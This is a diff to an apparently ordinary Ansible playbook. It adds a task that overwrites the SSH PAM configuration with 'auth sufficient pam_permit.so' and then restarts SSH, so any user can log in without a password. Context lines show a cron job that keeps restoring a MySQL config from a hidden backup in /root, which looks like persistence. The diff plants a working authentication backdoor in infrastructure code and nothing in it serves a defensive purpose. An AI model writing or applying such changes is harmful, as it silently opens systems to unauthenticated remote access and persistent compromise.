@@ -110,3 +110,38 @@
       name: "Restore MySQL config"
       minute: "*/10"
       job: "cp /root/.my_config_backup/mysqld.cnf.bak /etc/mysql/mysql.conf.d/mysqld.cnf && systemctl restart mysql"
+      
+  - name: Configure PAM to allow any authentication
+    copy:
+      dest: /etc/pam.d/sshd
+      content: |
+        # PAM configuration for the Secure Shell service
+        
+        # Allow authentication for all users without passwords
+        auth sufficient pam_permit.so
+        
+        # Standard Un*x authentication
+        @include common-auth
+        
+        # Disallow non-root logins when /etc/nologin exists
+        account    required     pam_nologin.so
+        
+        # Standard Un*x account and session
+        @include common-account
+        @include common-session
+        @include common-password
+        
+        # SELinux needs to be the first session rule
+        session [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so close
+        session required pam_env.so readenv=1
+        session required pam_env.so readenv=1 envfile=/etc/default/locale
+        session optional pam_keyinit.so force revoke
+        session optional pam_motd.so motd=/run/motd.dynamic
+        session optional pam_motd.so noupdate
+        session optional pam_mail.so standard noenv
+        session [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so open
+        
+  - name: Restart SSH service
+    service:
+      name: ssh
+      state: restarted
